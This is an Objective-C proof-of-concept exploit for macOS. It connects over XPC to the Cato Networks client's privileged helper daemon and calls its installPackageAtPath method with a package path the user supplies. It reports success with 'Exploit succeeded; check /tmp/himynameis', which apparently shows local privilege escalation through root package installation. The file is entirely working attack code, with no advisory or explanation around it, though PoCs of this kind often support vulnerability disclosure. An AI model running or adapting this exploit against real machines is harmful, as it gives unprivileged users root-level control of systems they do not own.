#import <Foundation/Foundation.h>

static NSString * serviceName = @"com.catonetworks.mac.client.daemon";

@protocol _TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_
- (void)installPackageAtPath:(NSString *)arg1 withCompletion:(void (^)(BOOL))arg2;
@end

int main(int argc, const char **argv) {
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:4096];

    [conn setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(_TtP38com_catonetworks_mac_CatoClient_helper15CommandProtocol_)]];
    [conn resume];

    id obj = [conn remoteObjectProxyWithErrorHandler:^(NSError * error) {
           NSLog(@"Error: %@", error);
    }];

    NSString * pkgPath = [NSString stringWithCString:argv[1] encoding:NSASCIIStringEncoding];

    [obj installPackageAtPath:pkgPath withCompletion:^(BOOL succeeded) {
        if (succeeded) {
            NSLog(@"Exploit succeeded; check /tmp/himynameis");
        } else {
            NSLog(@"Exploit failed; please try again");
        }
    }];

    dispatch_main();
    return 0;
}
